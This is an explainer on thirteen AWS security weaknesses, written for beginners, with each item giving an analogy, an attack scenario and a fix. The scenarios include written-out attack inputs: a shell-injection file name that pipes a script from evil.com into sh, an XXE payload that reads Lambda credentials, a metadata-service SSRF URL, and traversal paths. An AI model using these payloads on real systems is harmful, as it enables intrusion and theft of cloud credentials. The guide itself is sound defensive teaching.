# AWS Vulnerabilities: Explained Simply (Part 6)

Every item has: **Think of it like** → **Scenario** (step by step) → **Why it works** → **Fix** (and why it works).

## Words you will see a lot

- **AWS (Amazon Web Services)**: Amazon's **rented computers and tools on the internet**, like renting an office, storage room and workers instead of buying them.
- **S3 bucket**: a **cloud storage box** for files (photos, invoices, website files). Each file inside is called an **object**.
- **Lambda**: a small piece of your code that AWS runs **only when needed**, without you managing a server ("serverless").
- **EC2**: a rented virtual computer (server).
- **IAM (roles, policies)**: AWS's **permission system**: who can do what. A **role** is a set of permissions given to a service (like a job badge).
- **Least privilege**: give only the minimum permissions needed.
- **Cognito**: AWS's **login and user management service** (sign-up, sign-in). A **user pool** is the list of users, each with **attributes** (name, email, custom ones like `custom:role`).
- **CloudWatch**: where AWS **stores logs** (diary of what your apps did).
- **DNS record / CNAME**: the internet's **phone book**: `shop.company.com` points to some server or service.
- **Metadata service (169.254.169.254)**: a special address **only reachable from inside an EC2 server** that hands out its temporary secret keys.
- **Reverse proxy**: a **receptionist** in front of your servers. Visitors talk to the receptionist, who passes requests to the right internal server.
- **Dependency**: a library or package your code uses.

!!! info "Golden rules for AWS"


    1. *Most cloud breaches are **misconfigurations**, not clever hacking.*
    2. *Least privilege and "private by default."*
    3. *Anything the internet can reach, assume someone will try.*


---

## 1. Dangerous Dependencies

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/1395.html" target="_blank" rel="noopener noreferrer">CWE-1395</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1195/001/" target="_blank" rel="noopener noreferrer" title="Compromise Software Dependencies and Development Tools">ATT&amp;CK T1195.001</a></p>

!!! tip "Think of it like"

    Building your office with **parts bought from many suppliers**. If one supplier's part is faulty or sabotaged, your whole office has a weak spot, even if your own work is perfect.

!!! example "Scenario"


    1. A Lambda function that processes uploaded images uses an old version of an image library.
    2. That version has a **known bug** that lets a specially crafted image run code.
    3. An attacker uploads such an image. The Lambda runs the attacker's code with the Lambda's **IAM role** (which has access to the S3 bucket and database).
    4. Another case: the team installs a package with a **look-alike name** (`reqeusts` instead of `requests`) that steals AWS keys.

!!! warning "Why it works"

    Serverless apps are mostly **other people's code**. You inherit their bugs, and attackers know public vulnerabilities.

!!! success "Fix"


    - **Scan dependencies** automatically (Dependabot, Snyk, `pip-audit`, `npm audit`, Amazon Inspector supports Lambda scanning).
    - **Pin versions** and use lock files; update regularly.
    - Include **only what you need**, and use trusted sources and checked Lambda layers.
    - Give the function **least privilege** so even if it's exploited, the damage is small.

---

## 2. Excessive Logging

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/532.html" target="_blank" rel="noopener noreferrer">CWE-532</a></p>

!!! tip "Think of it like"

    A cashier who **writes every customer's card number and PIN on the daily notebook "to help fix problems later."** Anyone who reads the notebook can steal from everyone.

!!! example "Scenario"


    1. A developer enables debug logging in a Lambda: `print(event)`, which prints the **whole request**, including passwords, tokens and personal data.
    2. All of this is stored in **CloudWatch Logs** and kept forever.
    3. Many people (developers, support, a third-party log tool) have permission to read the logs.
    4. One compromised account, or an overly broad permission, exposes everyone's passwords and tokens.

!!! warning "Why it works"

    Logs are treated as "harmless," but they become a **second database** of secrets with weaker protection.

!!! success "Fix"


    - **Never log** passwords, tokens, keys, full card numbers or personal data. **Mask** them (e.g., `****1234`).
    - Use proper log levels: no `DEBUG` in production.
    - Limit who can read logs (IAM), **encrypt** with KMS, and set a **retention period** (e.g., 30 days).
    - Use CloudWatch Logs **data protection policies** or Amazon Macie to find and hide sensitive data.

    *(Note: too little logging is also a problem. Log events like logins and errors, but not the secrets.)*

---

## 3. Lambda Command Injection

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/78.html" target="_blank" rel="noopener noreferrer">CWE-78</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1059/" target="_blank" rel="noopener noreferrer" title="Command and Scripting Interpreter">ATT&amp;CK T1059</a></p>

!!! tip "Think of it like"

    A helper takes your note and **follows every instruction in it**, including "also open the safe," because he doesn't see where your request ends and the extra order begins.

!!! example "Scenario"


    1. A Lambda converts uploaded files using a system command: `os.system("convert " + filename + " out.png")`.
    2. An attacker uploads a file named `a.jpg; curl http://evil.com/x.sh | sh`.
    3. The command becomes two commands. The second downloads and runs the attacker's script **inside the Lambda**.
    4. Lambda stores its **temporary AWS keys in environment variables**, so the attacker reads them (`env`) and uses them from outside, with all the Lambda's permissions.

!!! warning "Why it works"

    User input is mixed into a shell command, and the shell treats `;`, `&&` and `|` as new commands.

!!! success "Fix"


    - **Avoid shell commands.** Use libraries (like Pillow for images) or run commands **without a shell**: `subprocess.run(["convert", filename, "out.png"], shell=False)`.
    - **Validate** inputs with an allow-list (e.g., only letters, digits and `.jpg`), or **generate your own file names** (UUIDs).
    - Give the Lambda role **minimal permissions**, so stolen keys are not very powerful.

---

## 4. Lambda XXE Injection

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/611.html" target="_blank" rel="noopener noreferrer">CWE-611</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1190/" target="_blank" rel="noopener noreferrer" title="Exploit Public-Facing Application">ATT&amp;CK T1190</a></p>

!!! tip "Think of it like"

    You send a letter saying, "**Please paste the contents of this private file here.**" The helpful office assistant does it and sends the letter back with the file inside.

!!! example "Scenario"


    1. A Lambda accepts XML orders and parses them with a default XML parser.
    2. The attacker sends:
       `<!DOCTYPE x [<!ENTITY a SYSTEM "file:///proc/self/environ">]><order>&a;</order>`
    3. XML has a feature called an **external entity** (a "load this file/URL here" instruction). The parser reads the Lambda's environment variables file and puts them in the result.
    4. The response shows `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `AWS_SESSION_TOKEN`. The attacker now has the Lambda's temporary credentials.

!!! warning "Why it works"

    Many XML parsers have external entities **enabled by default**, though almost nobody needs them.

!!! success "Fix"


    - **Disable DTDs and external entities** in the parser. In Python use `defusedxml`, and in Java set the secure-processing features.
    - Prefer **JSON** if XML isn't required.
    - Least privilege on the Lambda role, so leaked keys don't allow much.

---

## 5. Misconfigured AWS Cognito Attributes

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/915.html" target="_blank" rel="noopener noreferrer">CWE-915</a> <a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/269.html" target="_blank" rel="noopener noreferrer">CWE-269</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1098/" target="_blank" rel="noopener noreferrer" title="Account Manipulation">ATT&amp;CK T1098</a></p>

!!! tip "Think of it like"

    A hotel's reception form where guests can **fill in their own "VIP level" field** and the hotel believes it.

!!! example "Scenario"


    1. Cognito stores a custom attribute `custom:role` (user/admin) for each user.
    2. The app client is set so users **can edit their own attributes**.
    3. Sneha logs in and calls Cognito's update-user-attributes API to set `custom:role = admin`.
    4. The app reads her token, sees `admin`, and gives her admin powers.

!!! warning "Why it works"

    Attributes that decide **permissions** were writable by the same person they apply to.

!!! success "Fix"


    - In the **app client settings**, make sensitive attributes **read-only** (don't allow write access), and only change them from the backend with admin permissions.
    - Don't use user-editable attributes for authorization. Use **Cognito groups** managed by admins, or a server-side database.
    - Check roles **on the server** every time, and keep only needed attributes.

---

## 6. Misconfigured AWS Cognito Profile Allows Self-Registration

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/284.html" target="_blank" rel="noopener noreferrer">CWE-284</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1136/003/" target="_blank" rel="noopener noreferrer" title="Create Account: Cloud Account">ATT&amp;CK T1136.003</a></p>

!!! tip "Think of it like"

    An **"employees only" office whose front door has a "Sign up here for a staff card" desk open to anyone** walking in from the street.

!!! example "Scenario"


    1. A company builds an internal HR tool and uses Cognito for login. It's meant only for employees.
    2. **Self sign-up is left enabled** (the default in many setups), and the sign-up page works for anyone who finds the app client ID (which is public in the app's JavaScript).
    3. A stranger registers `hacker@gmail.com`, confirms the email and logs in.
    4. If the app only checks "is the user logged in?", the stranger sees internal data.

!!! warning "Why it works"

    The developer assumed "only my employees know about this app," but the sign-up API is open to the whole internet.

!!! success "Fix"


    - Set the user pool to **admin-only user creation** (disable self-registration, `AllowAdminCreateUserOnly = true`).
    - If self-registration is needed, restrict it (approved email domains, a pre-sign-up Lambda trigger, manual approval), and give new users **no permissions** by default.
    - Always check **authorization (groups/roles)**, not just "logged in."

---

## 7. Misconfigured Reverse Proxy

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/16.html" target="_blank" rel="noopener noreferrer">CWE-16</a></p>

!!! tip "Think of it like"

    A receptionist told "Send visitors to whoever they ask for," so a visitor says, "Take me to the **server room**" and is led straight there.

!!! example "Scenario"


    1. Nginx sits in front of the application. The config forwards almost everything to the backend: `location / { proxy_pass http://backend; }`.
    2. The backend has internal pages (`/admin`, `/metrics`, `/actuator/env`) meant to be reachable only from inside the company.
    3. A hacker types `https://app.company.com/admin` and the proxy happily passes it on.
    4. Another common mistake: small config errors in paths (like a missing slash in `location /static` / `alias`) let attackers read files outside the intended folder, or the proxy trusts the `Host` or `X-Forwarded-For` headers the attacker can fake.

!!! warning "Why it works"

    The proxy was set to "allow everything" instead of "allow only what's needed," and nobody tested edge cases.

!!! success "Fix"


    - **Allow-list** the exact routes that should be public; **deny everything else** by default, and block internal paths.
    - Put login and authorization **in the application too**, not only in the proxy.
    - Don't trust client-controlled headers (set `X-Forwarded-For`/`Host` yourself) and strip headers you don't need.
    - **Test** the config (try odd paths like `/..;/`, double slashes, encoded characters) and review it using config scanners.

---

## 8. S3 Bucket: Authenticated Users Have "WRITE" Access

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/732.html" target="_blank" rel="noopener noreferrer">CWE-732</a> <a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/284.html" target="_blank" rel="noopener noreferrer">CWE-284</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1565/001/" target="_blank" rel="noopener noreferrer" title="Stored Data Manipulation">ATT&amp;CK T1565.001</a></p>

!!! tip "Think of it like"

    A company noticeboard that says "**Anyone holding any bank account in the country may write on it or tear down notices.**" It sounds restricted, but millions of people qualify.

!!! example "Scenario"


    1. An old-style bucket ACL (permission list) grants WRITE to the group **"Authenticated Users."**
    2. Many people think this means "users of my company." In AWS it actually means **anyone with any AWS account in the world**, including a free one.
    3. An attacker makes a free AWS account and uploads a file (or **overwrites `index.html`/`app.js`**) in the company's bucket.
    4. If that bucket serves a website or scripts, visitors now load the attacker's malicious file.

!!! warning "Why it works"

    The name "Authenticated Users" is misleading: it only means "signed in to **some** AWS account."

!!! success "Fix"


    - **Remove** permissions for "Authenticated Users" and "Everyone (public)."
    - Turn on **S3 Block Public Access** (account-wide) and set **Object Ownership = "Bucket owner enforced"** to disable ACLs.
    - Grant access only with **IAM roles/policies** for named users/services (least privilege).
    - Turn on **versioning** (to recover overwritten files) and CloudTrail logging, and use AWS Config/Access Analyzer to alert on risky buckets.

---

## 9. S3 Bucket: Public "READ" Access

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/732.html" target="_blank" rel="noopener noreferrer">CWE-732</a> <a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/200.html" target="_blank" rel="noopener noreferrer">CWE-200</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1530/" target="_blank" rel="noopener noreferrer" title="Data from Cloud Storage">ATT&amp;CK T1530</a></p>

!!! tip "Think of it like"

    Storing your customer invoices in a **filing cabinet on the pavement with a sign "Please take a look."**

!!! example "Scenario"


    1. A developer makes a bucket public "just to share one file quickly."
    2. The bucket also holds invoices, backups and customer IDs.
    3. Attackers (and search tools like GrayhatWarfare) find open buckets by guessing names (`company-backups`, `company-invoices`) and download everything.
    4. The company only finds out when journalists call.

!!! warning "Why it works"

    Public read means **no login needed**, and bucket names are easy to guess. Automated scanners look for them all the time.

!!! success "Fix"


    - Enable **S3 Block Public Access** on every account and bucket (this is a master switch).
    - Keep buckets **private**. To share a file temporarily, use a **pre-signed URL** (a time-limited link). For a public website, use **CloudFront** with an Origin Access Control in front of a private bucket.
    - Enable **default encryption**, logging and alerts (Access Analyzer, Macie) to find sensitive public data.

---

## 10. S3 Directory Traversal

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noopener noreferrer">CWE-22</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1530/" target="_blank" rel="noopener noreferrer" title="Data from Cloud Storage">ATT&amp;CK T1530</a></p>

!!! tip "Think of it like"

    Each person has their own "folder," but it's really just a **name prefix on the box labels**. If the app builds the label from what you type, you can type someone else's prefix.

!!! example "Scenario"


    1. S3 has no real folders. A "folder" is just a **prefix in the file name**, like `users/ravi/report.pdf`.
    2. A download feature takes `?file=report.pdf` and builds the key: `"users/ravi/" + file`.
    3. Priya changes it to `?file=../priya/secret.pdf` or `?file=../../admin/keys.txt`. If the app (or a library/proxy in front of it) **normalizes** the `../`, the final key becomes `users/priya/secret.pdf` or something else.
    4. Even without `../`, an app that lets users supply the **full key** lets them read anything the app's role can read.

!!! warning "Why it works"

    The app has broad access to the whole bucket, and it **trusts user input to build the file path**.

!!! success "Fix"


    - Don't let users choose raw keys. **Map a file ID to the key on the server** and check that the file belongs to the logged-in user.
    - **Reject** `..`, `/` at the start, encoded versions (`%2e%2e`), and backslashes; check the final key still starts with the user's prefix.
    - Give the app's IAM role **limited prefixes** only (or use per-user pre-signed URLs). Keep sensitive files in a different bucket.
    - Generate your own random file names (UUIDs) when users upload files.

---

## 11. Server-Side Request Forgery (SSRF)

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/918.html" target="_blank" rel="noopener noreferrer">CWE-918</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1552/005/" target="_blank" rel="noopener noreferrer" title="Cloud Instance Metadata API">ATT&amp;CK T1552.005</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1190/" target="_blank" rel="noopener noreferrer" title="Exploit Public-Facing Application">ATT&amp;CK T1190</a></p>

!!! tip "Think of it like"

    You ask a trusted office assistant, "Please fetch the document at this address for me," and give the address of the **boss's locked cabinet**. You can't open it, but **he can**, and he hands it over.

!!! example "Scenario"


    1. A website feature: "Import image from URL" runs on an **EC2 server**.
    2. The attacker enters `http://169.254.169.254/latest/meta-data/iam/security-credentials/AppRole`.
    3. That address is the **instance metadata service**, reachable only from the server itself. The server fetches it and shows the result.
    4. The response contains **temporary AWS keys** of the server's role. The attacker uses them from his own laptop to read S3 buckets and databases. This pattern was behind several real-world cloud breaches.

!!! warning "Why it works"

    The server can reach internal addresses that the outside can't, and it blindly fetches whatever URL users give it.

!!! success "Fix"


    - Enforce **IMDSv2** (requires a session token and blocks simple SSRF) and set the **hop limit to 1**; disable the metadata service if not needed.
    - **Allow-list** the domains the app may fetch; block private IP ranges (`127.0.0.0/8`, `10.0.0.0/8`, `169.254.0.0/16`, etc.), and **re-check after DNS resolution** and redirects.
    - Don't return raw responses to users.
    - Give the instance role **least privilege**, so stolen keys do little, and restrict outbound traffic (egress rules).

---

## 12. Subdomain Takeover

<p class="vuln-tags"><a class="vtag atk" href="https://attack.mitre.org/techniques/T1584/001/" target="_blank" rel="noopener noreferrer" title="Compromise Infrastructure: Domains">ATT&amp;CK T1584.001</a></p>

!!! tip "Think of it like"

    You close a shop but **leave the signboard and address listing on the street directory**. A stranger rents the empty shop, and customers who follow the directory walk into **his** shop thinking it's yours.

!!! example "Scenario"


    1. The company created `shop.company.com` with a DNS **CNAME record** pointing to an S3 website (or CloudFront, Elastic Beanstalk, etc.).
    2. Later, the team **deletes the S3 bucket** but forgets to delete the DNS record. It's now a "dangling" record.
    3. An attacker notices `shop.company.com` points to a missing bucket, and **creates a bucket with that same name**.
    4. Now `shop.company.com` serves the attacker's page: a phishing login, malware, or scripts that steal cookies (cookies set for `.company.com` may be shared).

!!! warning "Why it works"

    DNS still trusts the old pointer, and cloud resource names can be claimed by someone else once they're free.

!!! success "Fix"


    - When you retire a resource, **delete the DNS record first** (or at the same time), and then the resource.
    - **Regularly scan** your DNS for records pointing to non-existent resources (tools like Subjack, `dnsReaper`, or AWS Config/Route 53 audits).
    - Keep an **inventory** of subdomains and owners; use wildcard certificates and cookie scopes carefully.

---

## 13. Weak S3 POST Upload Policy

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/434.html" target="_blank" rel="noopener noreferrer">CWE-434</a> <a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/770.html" target="_blank" rel="noopener noreferrer">CWE-770</a></p>

!!! tip "Think of it like"

    You give a visitor a **permission slip to drop a parcel in your storeroom**, but the slip says only "Put anything, anywhere, any size." He fills your room with junk or **replaces your important files**.

!!! example "Scenario"


    1. The app lets browsers upload straight to S3 using a **pre-signed POST** (a signed form with a **policy**: rules about what's allowed).
    2. The developer wrote a loose policy: key can start with `""` (anything), any content type, no size limit, long expiry.
    3. An attacker uses the form to:
       - upload a **50 GB file** (huge bill / storage abuse),
       - upload `evil.html` or `evil.js` with `text/html` content type (stored XSS/phishing from your domain),
       - choose a key like `config/app.json` and **overwrite** an existing important file.

!!! warning "Why it works"

    The policy is the only guard, and a policy with no conditions is basically no rules.

!!! success "Fix"

    Make the policy tight:

    - **Key**: fixed prefix per user (`uploads/<user-id>/`) or a server-generated random key.
    - **`content-length-range`**: allow only a small, sensible size (e.g., 1 byte to 5 MB).
    - **Content-Type**: allow only needed types (images), and validate on the server after upload (scan for malware).
    - **Short expiry** (a few minutes), restrict ACL (no public-read), and serve uploaded files from a **separate domain** with `Content-Disposition: attachment` where possible.
    - Don't allow overwrites (versioning on, unique keys).

---

## Quick summary

| Family | Items | One-line defence |
|---|---|---|
| Code mistakes inside Lambda | 3 Command injection, 4 XXE, 1 Dangerous dependencies | Don't use shells with user input; turn off XML entities; scan and update packages |
| Secrets in the wrong place | 2 Excessive logging, 11 SSRF (steals keys), 3 and 4 (steal Lambda keys) | Don't log secrets; IMDSv2; least privilege on roles |
| Open or wrongly shared storage | 8 Authenticated users WRITE, 9 Public READ, 10 Directory traversal, 13 Weak POST policy | Block Public Access, IAM only, tight policies, server-controlled keys |
| Login setup mistakes | 5 Cognito attributes, 6 Self-registration | Read-only sensitive attributes, admin-only sign-up, server-side checks |
| Front-door and DNS mistakes | 7 Reverse proxy, 12 Subdomain takeover | Allow-list routes; clean up DNS when deleting resources |

!!! success "Memory trick"

    *"Private by default, least privilege, and clean up after yourself."* Keep storage and services private, give only the permissions needed (so stolen keys do little), and delete the leftovers (DNS records, old buckets, debug logs).
